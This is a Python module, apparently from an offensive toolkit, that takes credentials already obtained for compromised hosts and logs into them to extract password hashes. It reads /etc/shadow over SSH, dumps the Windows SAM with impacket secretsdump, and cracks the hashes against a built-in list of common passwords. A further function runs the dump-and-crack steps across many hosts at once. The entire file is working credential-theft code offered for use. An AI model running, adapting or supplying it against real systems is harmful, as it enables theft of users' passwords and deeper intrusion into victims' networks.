"""
Expedite Strike Hash Dump & Cracking Engine
====================================
Extract and crack password hashes from compromised hosts.

MITRE ATT&CK: T1003.008 (Shadow), T1003.002 (SAM), T1003.004 (LSA), T1110.002 (Cracking)
"""

import os
import subprocess
import hashlib
import time
from typing import Callable

_log_fn = None

def _log(msg):
    if _log_fn:
        _log_fn(msg)

TOP_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "letmein", "welcome",
    "monkey", "dragon", "master", "qwerty", "login", "abc123", "passw0rd",
    "shadow", "123456789", "password1", "iloveyou", "sunshine", "princess",
    "administrator", "welcome1", "p@ssw0rd", "changeme", "test", "guest",
    "pass123", "1234", "12345", "1234567", "12345678", "1234567890",
    "qwerty123", "000000", "111111", "654321", "batman", "trustno1",
    "Hello123", "charlie", "donald", "football", "baseball", "soccer",
    "hockey", "ranger", "buster", "thomas", "robert", "summer",
    "winter", "spring", "autumn", "secret", "server", "computer",
    "internet", "service", "network", "system", "access", "control",
    "manager", "support", "testing", "default", "oracle", "postgres",
    "mysql", "mssql", "backup", "public", "private", "secure",
    "monitor", "desktop", "laptop", "mobile", "vpn123", "cisco",
    "juniper", "fortinet", "paloalto", "firewall", "switch", "router",
    "P@ssword1", "Admin123", "Pa$$w0rd", "Passw0rd!", "Welcome1!",
    "Tr0ub4dor&3", "correcthorsebatterystaple", "hunter2", "god",
    "love", "sex", "money", "power", "freedom", "justice", "peace",
    "msfadmin", "vagrant", "tester", "operator", "student", "teacher",
    "demo", "trial", "temp", "user", "user1", "admin1",
]


def dump_linux_hashes(ip: str, username: str, password: str,
                      log_fn: Callable = None) -> list:
    """SSH into host and extract /etc/shadow."""
    global _log_fn
    _log_fn = log_fn
    hashes = []

    _log(f"  [HASH] Dumping Linux hashes from {ip}...")

    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password,
                       timeout=10, allow_agent=False, look_for_keys=False)

        stdin, stdout, stderr = client.exec_command("cat /etc/shadow 2>/dev/null || sudo cat /etc/shadow 2>/dev/null")
        shadow_content = stdout.read().decode("utf-8", errors="ignore")

        for line in shadow_content.strip().split("\n"):
            if ":" in line and not line.startswith("#"):
                parts = line.split(":")
                if len(parts) >= 2 and parts[1] and parts[1] not in ("*", "!", "!!", "x"):
                    algo = "unknown"
                    h = parts[1]
                    if h.startswith("$6$"): algo = "SHA-512"
                    elif h.startswith("$5$"): algo = "SHA-256"
                    elif h.startswith("$1$"): algo = "MD5"
                    elif h.startswith("$y$"): algo = "yescrypt"

                    hashes.append({
                        "username": parts[0],
                        "hash": h,
                        "algorithm": algo,
                        "source": ip,
                        "crackable": algo in ("MD5", "SHA-256", "SHA-512"),
                    })

        client.close()
        _log(f"  [HASH] Extracted {len(hashes)} password hashes from {ip}")

    except ImportError:
        _log("  [HASH] paramiko not installed")
    except Exception as e:
        _log(f"  [HASH] Error dumping {ip}: {e}")

    _log_fn = None
    return hashes


def dump_windows_sam(ip: str, username: str, password: str,
                     domain: str = "", log_fn: Callable = None) -> list:
    """Extract SAM hashes using impacket secretsdump."""
    global _log_fn
    _log_fn = log_fn
    hashes = []

    _log(f"  [HASH] Dumping Windows SAM from {ip}...")

    try:
        target = f"{domain}/{username}:{password}@{ip}" if domain else f"{username}:{password}@{ip}"
        cmd = ["python", "-m", "impacket.examples.secretsdump", target, "-sam"]
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=120,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
        )
        output = result.stdout + result.stderr
        for line in output.split("\n"):
            if ":::" in line and not line.startswith("["):
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    hashes.append({
                        "username": parts[0],
                        "lm_hash": parts[2],
                        "ntlm_hash": parts[3].split(":::")[0],
                        "source": ip,
                    })

        _log(f"  [HASH] Extracted {len(hashes)} SAM hashes from {ip}")

    except Exception as e:
        _log(f"  [HASH] SAM dump error: {e}")

    _log_fn = None
    return hashes


def _builtin_crack(hash_value: str, algorithm: str = "ntlm") -> str:
    """Pure Python cracking against top passwords."""
    for pw in TOP_PASSWORDS:
        if algorithm == "ntlm":
            import hashlib
            nt_hash = hashlib.new("md4", pw.encode("utf-16le")).hexdigest()
            if nt_hash.lower() == hash_value.lower():
                return pw
        elif algorithm == "MD5" and hash_value.startswith("$1$"):
            try:
                import crypt
                if crypt.crypt(pw, hash_value) == hash_value:
                    return pw
            except ImportError:
                pass
    return ""


def crack_hashes(hashes: list, log_fn: Callable = None) -> list:
    """Attempt to crack hashes using builtin wordlist."""
    global _log_fn
    _log_fn = log_fn
    cracked = []

    _log(f"  [HASH] Cracking {len(hashes)} hashes with top {len(TOP_PASSWORDS)} passwords...")

    for h in hashes:
        hash_val = h.get("ntlm_hash") or h.get("hash", "")
        algo = "ntlm" if h.get("ntlm_hash") else h.get("algorithm", "unknown")

        result = _builtin_crack(hash_val, algo)
        if result:
            cracked.append({
                "username": h.get("username", ""),
                "password": result,
                "hash": hash_val[:20] + "...",
                "source": h.get("source", ""),
            })
            _log(f"  [HASH] \ud83d\udd13 Cracked: {h.get('username', '')} -> {result}")

    _log(f"  [HASH] Cracked {len(cracked)}/{len(hashes)} hashes ({len(cracked)/max(len(hashes),1)*100:.0f}%)")
    _log_fn = None
    return cracked


def run_hash_operations(compromised_hosts: list, log_fn: Callable = None) -> dict:
    """Orchestrate: dump from all hosts -> crack -> return results."""
    global _log_fn
    _log_fn = log_fn

    all_hashes = []
    for h in compromised_hosts:
        ip = h.get("ip", "")
        user = h.get("username", "")
        pw = h.get("password", "")
        os_type = h.get("os", "linux").lower()

        if not ip or not user or not pw:
            continue

        if "windows" in os_type:
            hashes = dump_windows_sam(ip, user, pw, h.get("domain", ""), log_fn)
        else:
            hashes = dump_linux_hashes(ip, user, pw, log_fn)

        all_hashes.extend(hashes)

    cracked = crack_hashes(all_hashes, log_fn)

    _log_fn = None
    return {
        "dumped_hashes": all_hashes,
        "cracked_passwords": cracked,
        "stats": {
            "total_hashes": len(all_hashes),
            "cracked": len(cracked),
            "crack_rate": f"{len(cracked)/max(len(all_hashes),1)*100:.1f}%",
        },
    }
